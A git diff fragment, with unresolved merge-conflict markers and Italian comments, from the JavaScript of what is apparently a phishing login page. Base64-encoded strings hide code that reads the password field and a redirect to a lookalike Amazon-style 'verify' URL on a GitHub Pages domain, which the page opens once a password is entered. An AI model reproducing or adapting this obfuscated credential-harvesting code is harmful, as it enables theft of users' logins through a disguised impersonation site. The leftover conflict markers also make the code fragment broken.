@@ -104,7 +104,11 @@
         // La password
         const passwordBase64 = "Y29uc3QgcGFzc3dvcmRJbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZCcpLnZhbHVl";
 
+<<<<<<< HEAD
         // L'URL di reindirizzamento
+=======
+        // L'URL di reindirizzamento criptato in Base64
+>>>>>>> acc789910ff771239ad96a2cd1e3f92e743c0678
         const redirectUrlBase64 = "aHR0cHM6Ly9hbXpvb29uLmdpdGh1Yi5pby9ob21lL3ZlcmlmeS1idWRoeXJ1Ymhxd2JobDg3b3QzNHdlZmczNDdxd29mZWdpYnFvN3c4M3Q2V1AzNEhZVVdPM1Q3TzM2RzdISVdGVDYwNFlJSFdQR1Q2MElISkZXVDM2ODcwMVBZMTMwVDZHWU5ISUpFRld5dWJmaTV0ODBnMnRnM2dwaTR5ODB0NTcycXdiaTM0MjgwNS5odG1s";
 
         // Funzione per generare un codice casuale di 10 lettere
@@ -136,7 +140,11 @@
                 // Reindirizza l'utente alla pagina di verifica del codice
                 localStorage.setItem('generatedCode', randomCode);
                 
+<<<<<<< HEAD
                 // Decodifica
+=======
+                // Decodifica l'URL di reindirizzamento
+>>>>>>> acc789910ff771239ad96a2cd1e3f92e743c0678
                 const redirectUrl = atob(redirectUrlBase64);
                 window.location.href = redirectUrl;
             } else {
